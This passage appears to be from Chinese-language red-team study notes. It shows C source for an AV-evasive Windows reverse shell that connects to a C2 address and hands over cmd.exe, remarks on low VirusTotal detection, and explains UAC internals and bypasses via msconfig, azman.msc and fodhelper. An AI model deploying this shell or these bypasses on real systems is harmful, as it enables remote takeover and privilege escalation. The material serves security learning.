style="color: #ABB2BF"> type, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> protocol, LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags);</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">unsigned</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">INET_ADDR)(</span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">cp);</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">u_short</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">HTONS)(</span><span style="color: #C678DD">u_short</span><span style="color: #ABB2BF"> hostshort);</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">WSACONNECT)(SOCKET s, </span><span style="color: #C678DD">const</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">struct</span><span style="color: #ABB2BF"> sockaddr </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">name, </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> namelen, LPWSABUF lpCallerData, LPWSABUF lpCalleeData, LPQOS lpSQOS, LPQOS lpGQOS);</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">CLOSESOCKET)(SOCKET s);</span></span><span class="line"><span style="color: #C678DD">typedef</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">int</span><span style="color: #ABB2BF">(WSAAPI </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">WSACLEANUP)(</span><span style="color: #C678DD">void</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">void</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RunShell</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">*</span><span style="color: #E06C75; font-style: italic">C2Server</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">C2Port</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">HMODULE hws2_32 </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">LoadLibraryW</span><span style="color: #ABB2BF">(L</span><span style="color: #98C379">&quot;ws2_32&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">WSASTARTUP myWSAStartup </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSASTARTUP)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSAStartup&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">WSASOCKETA myWSASocketA </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSASOCKETA)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSASocketA&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">INET_ADDR myinet_addr </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (INET_ADDR)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;inet_addr&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">HTONS myhtons </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (HTONS)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;htons&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">WSACONNECT myWSAConnect </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSACONNECT)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSAConnect&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">CLOSESOCKET myclosesocket </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (CLOSESOCKET)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;closesocket&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">WSACLEANUP myWSACleanup </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (WSACLEANUP)</span><span style="color: #61AFEF">GetProcAddress</span><span style="color: #ABB2BF">(hws2_32, </span><span style="color: #98C379">&quot;WSACleanup&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">SOCKET mySocket;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">struct</span><span style="color: #ABB2BF"> sockaddr_in addr;</span></span><span class="line"><span style="color: #ABB2BF">WSADATA version;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">myWSAStartup</span><span style="color: #ABB2BF">(</span><span style="color: #61AFEF">MAKEWORD</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">), </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">version);</span></span><span class="line"><span style="color: #ABB2BF">mySocket </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">myWSASocketA</span><span style="color: #ABB2BF">(AF_INET, SOCK_STREAM, IPPROTO_TCP, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">addr</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">sin_family</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> AF_INET;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">addr</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">sin_addr</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">s_addr</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">myinet_addr</span><span style="color: #ABB2BF">(C2Server);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">addr</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">sin_port</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">myhtons</span><span style="color: #ABB2BF">(C2Port);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #61AFEF">myWSAConnect</span><span style="color: #ABB2BF">(mySocket, (SOCKADDR </span><span style="color: #C678DD">*</span><span style="color: #ABB2BF">)</span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">addr, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(addr), </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">) </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> SOCKET_ERROR)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">myclosesocket</span><span style="color: #ABB2BF">(mySocket);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">myWSACleanup</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">else</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Connected to </span><span style="color: #D19A66">%s</span><span style="color: #98C379">:</span><span style="color: #D19A66">%d</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">n&quot;</span><span style="color: #ABB2BF">, C2Server, C2Port);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> Process</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;cmd.exe&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">STARTUPINFO sinfo;</span></span><span class="line"><span style="color: #ABB2BF">PROCESS_INFORMATION pinfo;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">memset</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">sinfo, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(sinfo));</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">cb</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">sizeof</span><span style="color: #ABB2BF">(sinfo);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwFlags</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (STARTF_USESTDHANDLES </span><span style="color: #C678DD">|</span><span style="color: #ABB2BF"> STARTF_USESHOWWINDOW);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hStdInput</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hStdOutput</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">sinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hStdError</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> (HANDLE)mySocket;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">CreateProcess</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, Process, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">TRUE</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">NULL</span><span style="color: #ABB2BF">, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">sinfo, </span><span style="color: #C678DD">&amp;</span><span style="color: #ABB2BF">pinfo);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">printf</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Process Created </span><span style="color: #D19A66">%lu</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">n&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">dwProcessId</span><span style="color: #ABB2BF">);</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">WaitForSingleObject</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">, INFINITE);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hProcess</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">CloseHandle</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">pinfo</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">hThread</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">main</span><span style="color: #ABB2BF">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> </span><span style="color: #E06C75; font-style: italic">argc</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> </span><span style="color: #C678DD">**</span><span style="color: #E06C75; font-style: italic">argv</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (argc </span><span style="color: #C678DD">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">3</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> port </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">atoi</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">2</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">RunShell</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">argv</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">], port);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">else</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">char</span><span style="color: #ABB2BF"> host</span><span style="color: #C678DD">[]</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.2.2.106&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">int</span><span style="color: #ABB2BF"> port </span><span style="color: #C678DD">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">4444</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #61AFEF">RunShell</span><span style="color: #ABB2BF">(host, port);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>最后可以用 <code>strip</code> 跑一遍，丢到 VT 上扫一下，检出率很低</p><img src="/thm_rthe/image-20250827162448859.png" class="" title="image-20250827162448859"><p>试想一下，如果用这种技术去造一个 Shellcode 加载器，用动态加载 + 函数名混淆 + shellcode 签名混淆 + 壳，过静态应该问题不大，容易检测的点都给他过了，要针对的就只是内存扫描了。</p><h1 id="Bypassing-UAC-绕过-UAC"><a href="#Bypassing-UAC-绕过-UAC" class="headerlink" title="Bypassing UAC 绕过 UAC"></a>Bypassing UAC 绕过 UAC</h1><p>之前在完成一些房间的时候接触到了老系统通过证书的 URL 来提权，这个房间详细介绍了现在可用的提权手段，是利用了 Windows 的 “feature”。</p><h2 id="UAC-的概念"><a href="#UAC-的概念" class="headerlink" title="UAC 的概念"></a>UAC 的概念</h2><p>UAC 是一个 Windows 的安全特性，默认情况下强制任何新进程以非特权帐户的安全上下文运行。该策略适用于任何用户启动的进程，包括管理员本人。其理念是我们不能仅依赖用户的身份来判断某些操作是否应被授权。</p><p>UAC 并没有把管理员账户变成普通账户，而是改变了程序运行时的<strong>默认权限</strong>。</p><ul><li><strong>没有 UAC 的时代</strong>：只要你用管理员身份登录，你运行的任何程序都自动拥有管理员的全部权限。</li><li><strong>有了 UAC 之后</strong>：默认情况下，你启动的任何程序（包括由管理员本人启动的）都只被赋予<strong>非特权账户</strong>的权限。这意味着，它无法随意修改系统文件、注册表等关键区域。</li></ul><p>当一个程序需要执行一个可能影响系统的操作时（比如安装软件），UAC 会弹出一个权限确认窗口。只有当管理员<strong>亲自点击“是”</strong>来授权后，这个程序才能临时获得管理员权限，完成特定任务。</p><h3 id="Integrity-Levels-完整性级别"><a href="#Integrity-Levels-完整性级别" class="headerlink" title="Integrity Levels 完整性级别"></a>Integrity Levels 完整性级别</h3><p>UAC 是一种强制完整性控制（Mandatory Integrity Control (MIC)），它通过为用户、进程和资源中的每一项分配一个完整性级别（IL）来实现区分。一般来说，具有更高 IL 的用户或进程访问令牌将能够访问具有较低或相等 IL 的资源。MIC 优先于常规的 Windows DACL，因此即便根据 DACL 你被授权访问某个资源，如果你的 IL 不够高也无济于事。</p><table><thead><tr><th><strong>完整性级别</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>Low</td><td>通常用于与互联网交互（例如 Internet Explorer）。权限非常有限。</td></tr><tr><td>Medium</td><td>分配给标准用户和管理员的受限令牌。</td></tr><tr><td>High</td><td>在启用 UAC 时由管理员的提升令牌使用。如果 UAC 被禁用，所有管理员将始终使用高完整性级别（High IL）令牌。</td></tr><tr><td>System</td><td>预留给系统使用</td></tr></tbody></table><h4 id="Filtered-Tokens-受限令牌"><a href="#Filtered-Tokens-受限令牌" class="headerlink" title="Filtered Tokens 受限令牌"></a>Filtered Tokens 受限令牌</h4><p>为实现这种角色分离，UAC 在登录时以略有不同的方式对待普通用户和管理员：</p><ul><li>非管理员用户会在登录的时候收到一个访问令牌，该令牌将用于用户执行的所有任务。该令牌具有 Medium IL。</li><li>管理员用户会收到两个访问令牌<ul><li>受限令牌：已被剥夺管理员权限的令牌，用于常规操作，该令牌具有 Medium IL。</li><li>提升令牌：一个拥有完全管理员权限的令牌，用于需要管理员权限运行的东西，该令牌具有 High IL。</li></ul></li></ul><p>总而言之，管理员在日常使用中会使用受限令牌，除非他们通过 UAC 请求提升权限。</p><h4 id="通过正常方式打开应用程序"><a href="#通过正常方式打开应用程序" class="headerlink" title="通过正常方式打开应用程序"></a>通过正常方式打开应用程序</h4><p>图1是正常打开应用程序的 Token，图2是通过管理员权限打开的。可以看到左边的是 Medium IL，右边的是 High IL，拥有的权限也更多。</p><img src="/thm_rthe/605235aa87c2f39689d0396bb3603967.png" class="" title="img"><h3 id="UAC-的设定"><a href="#UAC-的设定" class="headerlink" title="UAC 的设定"></a>UAC 的设定</h3><p>UAC 可以配置为以下四种不同的通知级别：</p><ul><li><strong>始终通知</strong>： 当程序试图安装应用或对计算机进行更改时，以及你手动修改 Windows 设置时，UAC 都会弹出通知并要求授权。这是最严格、最安全的设置。</li><li><strong>仅在程序试图对我的计算机进行更改时通知</strong> (默认设置)： 当程序试图安装应用或对计算机进行更改时，UAC 会弹出通知并要求授权。但如果你是管理员，手动更改 Windows 设置（例如，更改日期和时间）则不会触发 UAC 提示。</li><li>**仅在程序试图对我的计算机进行更改时通知 (不调暗桌面)**： 功能和上一个级别相同，但弹出 UAC 提示时不会调暗桌面。这会牺牲一部分安全性，因为恶意软件理论上有机会在提示窗口上模拟点击。</li><li><strong>从不通知</strong>： 禁用 UAC 提示。在这种模式下，管理员运行的所有程序都会默认获得最高权限，这与没有 UAC 时的行为相同。这是最不安全的设置，不推荐使用。</li></ul><h4 id="实际上只有两个档"><a href="#实际上只有两个档" class="headerlink" title="实际上只有两个档"></a>实际上只有两个档</h4><p>然而在微软的 Raymond Chen（陈瑞孟）在 <a href="https://devblogs.microsoft.com/oldnewthing/?p=94105">There are really only two effectively distinct settings for the UAC slider</a> 一文中说实际上只有两个档：</p><ul><li>始终通知</li><li>辣鸡</li></ul><p>src: <a href="https://blog.walterlv.com/post/there-are-only-two-settings-for-the-uac-slider.html">https://blog.walterlv.com/post/there-are-only-two-settings-for-the-uac-slider.html</a></p><h3 id="UAC-内部原理"><a href="#UAC-内部原理" class="headerlink" title="UAC 内部原理"></a>UAC 内部原理</h3><p>UAC 的核心，是应用程序信息服务（Application Information Service，或称 Appinfo）。每当用户需要提升权限时，会发生以下情况：</p><ol><li>用户请求以管理员身份运行应用程序。</li><li>使用 runas 语法调用 ShellExecute API。</li><li>请求被转发到 Appinfo 处理提升。</li><li>应用程序 manifest 会被检查，以确定是否允许自动提升（稍后详述）。</li><li>Appinfo 会执行 consent.exe，在安全桌面上显示 UAC 提示。安全桌面只是一个独立的桌面，它将进程与实际用户桌面上运行的进程隔离开来，以避免其他进程以任何方式篡改 UAC 提示。</li><li>如果用户同意以管理员身份运行应用程序，Appinfo 服务将使用用户的提升令牌执行请求。然后，Appinfo 将设置新进程的父进程 ID，使其指向请求提升的 shell。</li></ol><img src="/thm_rthe/fce906f0e438efa938753430e5d25afe.png" class="" title="img"><h2 id="绕过-UAC"><a href="#绕过-UAC" class="headerlink" title="绕过 UAC"></a>绕过 UAC</h2><p><strong>UAC 与权限的假象</strong></p><ol><li><strong>权限受限</strong>：即使攻击者通过管理员账户获得了远程 shell（例如 PowerShell），他们也无法直接执行 <code>net user /add</code> 等管理任务。这是因为 <strong>UAC</strong> 强制所有新进程（包括管理员自己的进程）以<strong>中等完整性级别（Medium IL）</strong>运行，这是一种权限受限的模式。</li><li><strong>受限令牌</strong>：<code>whoami /groups</code> 命令的输出显示，该会话正在使用一个<strong>受限令牌</strong>，这意味着它虽然属于 <code>Administrators</code> 组，但却没有执行管理任务的权限。</li><li><strong>目标：绕过 UAC</strong>：为了获得<strong>高完整性级别（High IL）</strong>的完全控制权限，攻击者必须绕过 UAC。</li></ol><hr><p><strong>微软对 UAC 的态度</strong></p><ol><li><strong>不是安全边界</strong>：微软并不将 UAC 视为一种安全边界，而是将其定位为一种<strong>方便管理员的提醒工具</strong>。它旨在防止用户在不知情的情况下运行高权限进程。</li><li><strong>非漏洞</strong>：由于 UAC 不是安全边界，微软认为任何绕过 UAC 的技术都不算作漏洞，因此很多已知的绕过方法至今仍未被修补。</li></ol><p><strong>UAC 绕过的通用方法</strong></p><ol><li><strong>利用高完整性级别进程</strong>：大多数 UAC 绕过技术都利用一个已经以高完整性级别运行的<strong>合法父进程</strong>，来执行攻击者的代码。</li><li><strong>权限继承</strong>：一个由高完整性级别父进程创建的新进程，会自动<strong>继承</strong>相同的完整性级别。攻击者正是利用这一点，在不触发 UAC 提示的情况下，获得一个高权限的 shell。</li></ol><p>攻击者的目标是利用操作系统自身的信任机制，通过一个合法的、高权限的父进程，来获得一个完全控制的 shell，从而实现 UAC 绕过。</p><h3 id="基于-GUI-的绕过"><a href="#基于-GUI-的绕过" class="headerlink" title="基于 GUI 的绕过"></a>基于 GUI 的绕过</h3><h4 id="msconfig"><a href="#msconfig" class="headerlink" title="msconfig"></a>msconfig</h4><p>通过运行 msconfig，可以在不触发 UAC 的情况下获得一个 High IL，然后可以在 Tools 选项卡里打开 cmd，这个新运行的 cmd 会继承 msconfig 同样的访问令牌，这样你就有了一个具有 High IL 的 cmd 了。</p><p>这是通过一个称为“自动提升”的功能实现的，该功能允许特定二进制文件在不需要用户交互的情况下提升权限。</p><h4 id="azman-msc"><a href="#azman-msc" class="headerlink" title="azman.msc"></a>azman.msc</h4><p>同样是 Win + R 运行，这里打开之后找到菜单栏 -&gt; 帮助 -&gt; 在弹出窗口里面点击查看源码，然后会打开默认的 notepad 应用，然后在 notepad 里面打开文件的时候运行 cmd，这样你就有了一个具有 High IL 的 cmd 了。</p><img src="/thm_rthe/image-20250827174454143.png" class="" title="image-20250827174454143"><h3 id="自动提权的进程"><a href="#自动提权的进程" class="headerlink" title="自动提权的进程"></a>自动提权的进程</h3><p>之前提到某些可执行程序能在不需要用户交互的情况下自动提升到 High IL，这适用于控制面板的大部分功能以及 Windows 附带的一些可执行文件。</p><p>对于应用程序，自动提权需要满足一些要求：</p><ol><li>可执行文件必须由 Windows Publisher 签名</li><li>可执行文件必须包含在受信任的目录中，如 <code>%SystemRoot%/System32/</code> 或 <code>%ProgramFiles%/</code></li></ol><p>根据应用程序的类型，可能会有其他要求：</p><ul><li>可执行文件 (.exe) 必须在其清单中声明 autoElevate 元素。要检查文件的清单，我们可以使用 Sysinternals 套件提供的工具 <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sigcheck">sigcheck</a>。如果我们检查 msconfig.exe 的 manifest，就会发现 autoElevate 属性：</li></ul><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">C:\tools\&gt; sigcheck64.exe -m c:/windows/system32/msconfig.exe</span></span><span class="line"><span style="color: #abb2bf">...</span></span><span class="line"><span style="color: #abb2bf">&lt;asmv3:application&gt;</span></span><span class="line"><span style="color: #abb2bf">&lt;asmv3:windowsSettings xmlns=&quot;http://schemas.microsoft.com/SMI/2005/WindowsSettings&quot;&gt;</span></span><span class="line"><span style="color: #abb2bf">&lt;dpiAware&gt;true&lt;/dpiAware&gt;</span></span><span class="line"><span style="color: #abb2bf">&lt;autoElevate&gt;true&lt;/autoElevate&gt;</span></span><span class="line"><span style="color: #abb2bf">&lt;/asmv3:windowsSettings&gt;</span></span><span class="line"><span style="color: #abb2bf">&lt;/asmv3:application&gt;</span></span></code></pre></div></div></figure><ul><li>mmc.exe 将根据用户请求的 .msc 快速插件自动提升。Windows 附带的大多数 .msc 文件都会自动提升。</li><li>Windows 还保留了一个额外的可执行文件列表，这些可执行文件即使未在清单中请求，也会自动提升级别。该列表包括 pkgmgr.exe 和 spinstall.exe。</li><li>COM 对象也可以通过配置某些注册表键值来请求自动提升 (<a href="https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)%E3%80%82">https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker)。</a></li></ul><h4 id="Fodhelper"><a href="#Fodhelper" class="headerlink" title="Fodhelper"></a>Fodhelper</h4><p>Fodhelper.exe 是 Windows 的一个默认可执行文件，负责管理 Windows 可选功能，包括额外语言、未默认安装的应用程序或其他操作系统特性。fodhelper 在使用默认 UAC 设置时可以自动提升权限，但与 msconfig 不同，fodhelper 可以在不访问 GUI 的情况下被滥用。</p><p>从攻击者的角度来看，这意味着它可以通过中等完整性远程 shell 使用，并提升为完全功能的高完整性进程。这个特定技术由 <a href="https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/">@winscripting</a> 发现，并曾被 Glupteba 恶意软件在野使用。</p><p>fodhelper 会在注册表中搜索一个键，通过 Process Monitor 可以看到：</p><img src="/thm_rthe/eb7ac876cd05f51495f9882fa00ef832.png" class="" title="img"><p>当 Windows 打开一个文件时，它会检查注册表以确定应使用哪个应用程序。注册表为每种文件类型保存一个称为程序标识符（ProgID）的键，其中关联了相应的应用程序。比如你尝试打开一个 HTML 文件。系统会检查名为 HKEY_CLASSES_ROOT 的注册表部分，以便知道必须使用你首选的网页客户端来打开它。要使用的命令将在每个文件 ProgID 的 <code>shell/open/command</code> 子键下指定。以 “htmlfile” ProgID 为例：</p><img src="/thm_rthe/2428d786ec68d8731dc98b6598211eb9.png" class="" title="img"><p>实际上，HKEY_CLASSES_ROOT 只是注册表中两条不同路径的合并视图：</p><table><thead><tr><th><strong>Path</strong></th><th><strong>Description</strong></th></tr></thead><tbody><tr><td>HKEY_LOCAL_MACHINE\Software\Classes</td><td>系统范围文件关联</td></tr><tr><td>HKEY_CURRENT_USER\Software\Classes</td><td>活动用户的文件关联</td></tr></tbody></table><p>在检查 HKEY_CLASSES_ROOT 时，如果在 HKEY_CURRENT_USER（HKCU）下存在用户特定的关联项，则优先使用用户的。如果未配置用户特定的关联项，则会改为使用 HKEY_LOCAL_MACHINE（HKLM）下的全局关联项。</p><p>当 <code>fodhelper.exe</code> 运行时，它会尝试调用 <code>ms-settings:</code> 协议来打开一个设置页面。它会去注册表查找这个协议的默认处理程序，我们可以在当前用户的 HKCU 中为这个 ProgID 创建一个关联，就会覆盖掉系统的默认关联。因为 fodhelper 是自动提权的，所以它启动的任何子进程都将继承高完整性令牌。</p><h4 id="实践-3"><a href="#实践-3" class="headerlink" 